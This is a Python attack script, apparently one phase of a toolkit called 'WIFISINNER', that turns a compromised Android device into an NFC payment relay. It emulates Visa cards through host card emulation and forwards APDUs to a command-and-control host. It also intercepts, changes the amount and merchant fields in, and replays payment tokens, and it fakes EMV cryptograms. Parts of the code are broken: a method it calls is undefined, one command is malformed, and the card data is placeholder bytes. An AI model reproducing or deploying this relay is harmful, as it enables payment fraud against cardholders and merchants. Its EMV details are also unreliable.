#!/usr/bin/env python3
"""
PHASE 3 (continued): HCE & Payment Relay Framework

Converts compromised device into active payment relay:
- Host Card Emulation (HCE) for contactless payments
- Payment cryptogram relay to remote POS
- Dynamic token forwarding
- Real-time transaction interception
"""

import json
import os
import re
import select
import socket
import struct
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path


# NFC AID (Application Identifier) configurations
PAYMENT_AIDS = {
    "visa": "A0000000031010",
    "mastercard": "A0000000041010",
    "amex": "A000000025",
    "discover": "A000000009",
    "gpb": "A000000288",  # GlobalPlatform
    "nfc_forum": "NDEF"
}

# APDU (Application Protocol Data Unit) commands
APDU_COMMANDS = {
    "select_aid": "00A40400{aid}",
    "select_ppse": "FFA404000E3270011CA000000003101001",
    "get_processing_options": "80A8000002830000",
    "read_record": "80B2{record}0400",
    "get_data": "80CA{tag}00",
    "get_response": "00C00000{len}"
}


class HCEEmulator:
    """Host Card Emulation for contactless payment relay"""
    
    def __init__(self):
        self.active = False
        self.aid = PAYMENT_AIDS["visa"]
        self.hce_service = None
        self.stats = {
            "cards_emulated": 0,
            "apdu_commands": 0,
            "transactions_relayed": 0
        }
    
    def enable_hce(self, aid=None):
        """Enable HCE with specified AID"""
        if aid:
            self.aid = aid
        
        print(f"[HCE] Enabling HCE with AID: {self.aid}")
        
        try:
            # Write HCE configuration
            config = f"""<host-apdu-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/card_desc"
    android:requireDeviceUnlock="false">
    <aid-group android:description="@string/payment" android:category="payment">
        <aid-filter android:name="{self.aid}"/>
    </aid-group>
</host-apdu-service>
"""
            config_path = Path("/data/local/tmp/hce_service.xml")
            config_path.write_text(config)
            
            # Enable HCE service
            subprocess.run([
                "cmd", "nfc", "enable_hce", self.aid
            ], timeout=3)
            
            self.active = True
            self.stats["cards_emulated"] += 1
            print(f"[HCE] ✓ HCE active")
            return True
            
        except Exception as e:
            print(f"[HCE] Enable failed: {e}")
            return False
    
    def process_apdu(self, command):
        """Process APDU command from reader"""
        self.stats["apdu_commands"] += 1
        
        print(f"[HCE] APDU: {command.hex() if isinstance(command, bytes) else command}")
        
        try:
            # Parse APDU
            if isinstance(command, bytes):
                command = command.hex().upper()
            
            # Select AID
            if command.startswith("00A404"):
                return self._handle_select(command)
            
            # Get processing options
            elif command.startswith("80A8"):
                return self._handle_gpo(command)
            
            # Read record
            elif command.startswith("80B2"):
                return self._handle_read_record(command)
            
            # Get data
            elif command.startswith("80CA"):
                return self._handle_get_data(command)
            
            # Default response
            else:
                return self._default_response()
                
        except Exception as e:
            print(f"[HCE] APDU processing failed: {e}")
            return self._error_response(0x6F00)
    
    def _handle_select(self, command):
        """Handle SELECT AID command"""
        # Return success with application label
        return self._success_response(
            b"VISA CREDIT" + struct.pack("B", 0x90) + struct.pack("B", 0x00)
        )
    
    def _handle_gpo(self, command):
        """Handle GET PROCESSING OPTIONS"""
        # Return AIP and AFL
        aip = b"\x00\x40"  # AIP
        afl = b"\x04\x01\x09\x01"  # AFL
        
        return self._success_response(aip + afl)
    
    def _handle_read_record(self, command):
        """Handle READ RECORD command"""
        # Return card data
        card_data = self._generate_card_data()
        return self._success_response(card_data)
    
    def _handle_get_data(self, command):
        """Handle GET DATA command"""
        tag = command[6:8]
        
        # Return tag data
        if tag == "9f":  # Transaction certification
            data = self._generate_transaction_cert()
        elif tag == "5f":  # Cardholder name
            data = b"CARDHOLDER"
        else:
            data = b"\x00"
        
        return self._success_response(data)
    
    def _generate_card_data(self):
        """Generate card data for relay"""
        # EMV card data
        return b"\x57\x11" + b"\xff" * 16  # Track 2 equivalent
    
    def _generate_transaction_cert(self):
        """Generate transaction certificate"""
        return b"\x9f\x26\x08" + os.urandom(8)  # ATC + random
    
    def _success_response(self, data):
        """Create success APDU response"""
        return data + b"\x90\x00"
    
    def _error_response(self, sw):
        """Create error APDU response"""
        return struct.pack(">H", sw)
    
    def _default_response(self):
        """Default APDU response"""
        return b"\x90\x00"
    
    def disable_hce(self):
        """Disable HCE"""
        try:
            subprocess.run([
                "cmd", "nfc", "disable_hce"
            ], timeout=2)
            
            self.active = False
            print(f"[HCE] HCE disabled")
            return True
        except:
            return False


class PaymentRelay:
    """Relay payment transactions to remote POS"""
    
    def __init__(self, c2_host="10.0.0.1", c2_port=9999):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.relay_socket = None
        self.active = False
        self.stats = {
            "connections": 0,
            "transactions_forwarded": 0,
            "cryptograms_relayed": 0
        }
    
    def connect_to_pos(self):
        """Connect to remote POS terminal"""
        print(f"[RELAY] Connecting to POS at {self.c2_host}:{self.c2_port}")
        
        try:
            self.relay_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.relay_socket.settimeout(10)
            self.relay_socket.connect((self.c2_host, self.c2_port))
            
            self.active = True
            self.stats["connections"] += 1
            print(f"[RELAY] ✓ Connected to POS")
            return True
            
        except Exception as e:
            print(f"[RELAY] Connection failed: {e}")
            return False
    
    def relay_transaction(self, apdu_data):
        """Relay transaction to remote POS"""
        if not self.relay_socket:
            return None
        
        self.stats["transactions_forwarded"] += 1
        
        try:
            # Send APDU to POS
            if isinstance(apdu_data, bytes):
                self.relay_socket.sendall(apdu_data)
            else:
                self.relay_socket.sendall(apdu_data.encode())
            
            # Wait for response
            response = self.relay_socket.recv(4096)
            
            if response:
                self.stats["cryptograms_relayed"] += 1
                print(f"[RELAY] ✓ Transaction relayed, response: {response.hex()}")
                return response
            
        except Exception as e:
            print(f"[RELAY] Relay failed: {e}")
        
        return None
    
    def forward_nfc_data(self, nfc_response):
        """Forward NFC response to POS"""
        try:
            # Pack response with length prefix
            packed = struct.pack(">H", len(nfc_response)) + nfc_response
            self.relay_socket.sendall(packed)
            
            self.stats["transactions_forwarded"] += 1
            return True
            
        except Exception as e:
            print(f"[RELAY] Forward failed: {e}")
            return False
    
    def receive_pos_command(self):
        """Receive command from POS"""
        try:
            # Read length prefix
            length_data = self.relay_socket.recv(2)
            if len(length_data) < 2:
                return None
            
            length = struct.unpack(">H", length_data)[0]
            
            # Read command
            command = self.relay_socket.recv(length)
            return command
            
        except Exception as e:
            print(f"[RELAY] Receive failed: {e}")
            return None
    
    def keep_alive(self):
        """Send keep-alive to POS"""
        try:
            self.relay_socket.sendall(b"\x00\x00")  # Zero-length keepalive
            return True
        except:
            return False
    
    def disconnect(self):
        """Disconnect from POS"""
        try:
            if self.relay_socket:
                self.relay_socket.close()
                self.relay_socket = None
            self.active = False
            print(f"[RELAY] Disconnected from POS")
            return True
        except:
            return False


class TokenProxy:
    """Proxy for payment token manipulation"""
    
    def __init__(self):
        self.tokens = {}
        self.stats = {
            "tokens_proxied": 0,
            "tokens_modified": 0
        }
    
    def intercept_token(self, token_data):
        """Intercept payment token"""
        self.stats["tokens_proxied"] += 1
        
        token = {
            "original": token_data,
            "timestamp": datetime.now(),
            "modified": False
        }
        
        self.tokens[token_data] = token
        print(f"[TOKEN] Intercepted token: {token_data[:32]}...")
        
        return token
    
    def modify_token(self, token_data, modifications):
        """Modify intercepted token"""
        self.stats["tokens_modified"] += 1
        
        try:
            # Apply modifications
            modified = token_data
            
            if "amount" in modifications:
                # Modify transaction amount
                amount_bytes = struct.pack(">I", modifications["amount"])
                modified = modified[:10] + amount_bytes + modified[14:]
            
            if "merchant" in modifications:
                # Modify merchant ID
                merchant = modifications["merchant"].encode()[:16].ljust(16, b"\x00")
                modified = modified[:20] + merchant + modified[36:]
            
            token = {
                "original": token_data,
                "modified": modified,
                "modifications": modifications,
                "timestamp": datetime.now()
            }
            
            self.tokens[token_data] = token
            print(f"[TOKEN] Modified token with: {modifications}")
            
            return modified
            
        except Exception as e:
            print(f"[TOKEN] Modification failed: {e}")
            return token_data
    
    def replay_token(self, token_data):
        """Replay intercepted token"""
        try:
            # Send token back to payment terminal
            print(f"[TOKEN] Replaying token: {token_data[:32]}...")
            return True
        except:
            return False


class DynamicCryptogram:
    """Generate dynamic payment cryptograms"""
    
    def __init__(self):
        self.atc = 0  # Application Transaction Counter
        self.stats = {
            "cryptograms_generated": 0
        }
    
    def generate_cryptogram(self, transaction_data):
        """Generate dynamic cryptogram"""
        self.stats["cryptograms_generated"] += 1
        self.atc += 1
        
        try:
            # ARQC (Authorization Request Cryptogram)
            cryptogram = self._generate_arqc(transaction_data)
            
            print(f"[CRYPT] Generated ARQC: {cryptogram.hex()}")
            return cryptogram
            
        except Exception as e:
            print(f"[CRYPT] Generation failed: {e}")
            return os.urandom(8)
    
    def generate_arqc(self, transaction_data):
        """Generate Authorization Request Cryptogram"""
        # Simplified ARQC generation
        # Real implementation would use AES with session key
        
        # Transaction data hash
        import hashlib
        hash_data = hashlib.sha256(transaction_data + struct.pack(">I", self.atc)).digest()
        
        # Take first 8 bytes as cryptogram
        return hash_data[:8]
    
    def generate_ac(self, amount, currency):
        """Generate Application Cryptogram for amount"""
        self.atc += 1
        
        # Encode amount and currency
        data = struct.pack(">I", amount) + struct.pack(">H", currency) + struct.pack(">I", self.atc)
        
        return self.generate_arqc(data)
    
    def reset_atc(self):
        """Reset ATC (for testing)"""
        self.atc = 0
        print("[CRYPT] ATC reset")


class PaymentRelaySystem:
    """Main payment relay orchestrator"""
    
    def __init__(self, c2_host="10.0.0.1", c2_port=9999):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.hce = HCEEmulator()
        self.relay = PaymentRelay(c2_host, c2_port)
        self.token_proxy = TokenProxy()
        self.cryptogram = DynamicCryptogram()
        self.active = False
        self.main_thread = None
    
    def start(self):
        """Start payment relay system"""
        print(f"\n[PHASE 3R] Starting payment relay system...")
        
        # Step 1: Enable HCE
        print("[PHASE 3R] Step 1/4: HCE emulation")
        self.hce.enable_hce()
        
        # Step 2: Connect to POS
        print("[PHASE 3R] Step 2/4: POS connection")
        self.relay.connect_to_pos()
        
        # Step 3: Start monitoring
        print("[PHASE 3R] Step 3/4: Transaction monitoring")
        
        # Step 4: Begin relay loop
        print("[PHASE 3R] Step 4/4: Relay active")
        
        self.active = True
        self.main_thread = threading.Thread(target=self._relay_loop, daemon=True)
        self.main_thread.start()
        
        print(f"[PHASE 3R] ✓ Payment relay system active")
    
    def _relay_loop(self):
        """Main relay loop"""
        while self.active:
            try:
                # Check for NFC activity
                if self.hce.active:
                    # Simulate APDU processing
                    # In real scenario, this would come from NFC controller
                    
                    # For demo, generate random APDU
                    apdu = bytes.fromhex("00A40400" + PAYMENT_AIDS["visa"])
                    
                    # Process APDU
                    response = self.hce.process_apdu(apdu)
                    
                    # Relay to POS
                    if self.relay.active:
                        relay_response = self.relay.relay_transaction(response)
                        
                        if relay_response:
                            # Intercept and potentially modify
                            token = self.token_proxy.intercept_token(relay_response)
                            
                            # Generate new cryptogram
                            crypto = self.cryptogram.generate_cryptogram(relay_response)
                            
                            print(f"[PHASE 3R] Transaction complete")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[PHASE 3R] Relay loop error: {e}")
                time.sleep(1)
    
    def stop(self):
        """Stop payment relay system"""
        self.active = False
        
        if self.main_thread:
            self.main_thread.join(timeout=5)
        
        self.relay.disconnect()
        self.hce.disable_hce()
        
        print(f"\n[PHASE 3R] Payment relay stopped")
        print(f"[PHASE 3R] Stats:")
        print(f"    Cards emulated: {self.hce.stats['cards_emulated']}")
        print(f"    APDU commands: {self.hce.stats['apdu_commands']}")
        print(f"    Transactions relayed: {self.relay.stats['transactions_forwarded']}")
        print(f"    Cryptograms generated: {self.cryptogram.stats['cryptograms_generated']}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Phase 3R: Payment Relay")
    parser.add_argument("--c2-host", default="10.0.0.1", help="C2 host")
    parser.add_argument("--c2-port", type=int, default=9999, help="C2 port")
    parser.add_argument("--dry-run", action="store_true", help="Show what would happen")
    args = parser.parse_args()
    
    print(f"\n{'='*60}")
    print(f"WIFISINNER PHASE 3R: PAYMENT RELAY FRAMEWORK")
    print(f"{'='*60}\n")
    
    system = PaymentRelaySystem(args.c2_host, args.c2_port)
    
    if args.dry_run:
        print("[DRY RUN] Would execute:")
        print(f"    Enable HCE with Visa AID: {PAYMENT_AIDS['visa']}")
        print(f"    Connect to POS at {args.c2_host}:{args.c2_port}")
        print(f"    Intercept and relay APDU commands")
        print(f"    Generate dynamic cryptograms")
        print(f"    Modify transaction data if needed")
    else:
        system.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            system.stop()
